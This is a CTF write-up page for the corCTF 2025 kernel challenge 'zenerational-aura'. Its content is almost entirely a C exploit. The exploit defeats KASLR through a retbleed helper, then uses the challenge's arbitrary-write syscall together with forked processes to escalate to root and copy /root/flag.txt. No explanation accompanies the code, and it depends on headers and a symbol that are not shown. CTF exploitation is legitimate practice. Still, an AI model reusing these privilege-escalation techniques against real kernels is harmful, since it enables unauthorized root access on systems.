---
title: "zenerational-aura - corCTF 2025"
category: "misc"
subcategory: "kernel"
type: "writeup"
tags: ["misc", "kernel-pwn", "scanf", "zenerational-aura", "kernel", "corctf", "corctf-2025", "2025", "ctf-writeup"]
summary: "/ SPDX-License-Identifier: GPL-3.0-only /"
source:
  name: "CTFtime writeup #40434"
  url: "https://ctftime.org/writeup/40434"
original_source: "https://uz56764.tistory.com/130"
ctf:
  name: "corCTF 2025"
  year: 2025
  challenge: "zenerational-aura"
---

## Metadata

- **CTF:** corCTF 2025
- **Task:** zenerational-aura
- **Author team:** The Amazing Digital Orange!
- **CTFtime:** <https://ctftime.org/writeup/40434>
- **Original writeup:** <https://uz56764.tistory.com/130>

---
> <https://uz56764.tistory.com/130>

```  
/* SPDX-License-Identifier: GPL-3.0-only */  
#define _GNU_SOURCE

#include <err.h>  
#include <errno.h>  
#include <fcntl.h>  
#include <getopt.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <sched.h>  
#include <time.h>  
#include <unistd.h>

#include <sys/user.h>  
#include <sys/utsname.h>

#include "defs.h"  
#include "proclist.h"  
#include "retbleed.h"

#define fatal(...) err(EXIT_FAILURE, __VA_ARGS__)  
#define fatalx(...) errx(EXIT_FAILURE, __VA_ARGS__)

#include <string.h>  
#include <stdint.h>

#include <errno.h>  
#include <stdbool.h>  
#include <sys/wait.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;  
unsigned long kbase = 0x0;  
unsigned long prepare_kernel_cred = 0x0;  
unsigned long commit_creds = 0x0;  
unsigned long init_cred = 0x0;

static inline long corctf_crash(uint64_t addr, uint64_t val) {  
return syscall(470, addr, val);  
}

int main(int argc, char *argv[])  
{  
u64 kaslr_base = retbleed_break_text_kaslr();  
printf("[+] KASLR base: %#lx\n", kaslr_base);

puts("Hello World");  
kbase = kaslr_base;

uint64_t set_gadget = kbase + 0xffffffff818e56fe - 0xffffffff81000000;  
uint64_t rite = kbase + 0xffffffff82757d04 - 0xffffffff81000000;

if(*argv[1]=='1'){  
corctf_crash(set_gadget, panic_on_oop-0x30);  
} else if(*argv[1]=='2'){

for(int i=0x0; i<0x30;i++){  
pid_t pid = fork();  
if (pid == 0) {  
while(true){  
sleep(1);  
uid_t ruid = getuid();  
if(ruid == 0)  
break;  
}  
system("cp /root/flag.txt /tmp/flag.txt; chmod 644 /tmp/flag.txt; touch /tmp/a");  
getchar();  
exit(0);  
}  
}

printf("target: ");  
uint64_t target = 0x0;  
scanf("%lx", &target);

for(int ii=0x0; ii<0x1;ii++){  
pid_t pid = fork();  
if (pid == 0) {  
for(int i=0x0; i<5;i++){  
pid_t pid = fork();  
if (pid == 0) {  
target = (target&0xfffffffff0000000) + 0x129cc00 + 0x8 + i*8;  
printf("[+] target %#lx\n", target);  
corctf_crash(set_gadget, target-0x30); // ffffffff98200000  
} // ffffffff85c00000  
}  
exit(0);  
}  
}  
getchar();  
} else {  
puts(argv[1]);  
getchar();  
} // 0xffffffff82e00000   
}  
```
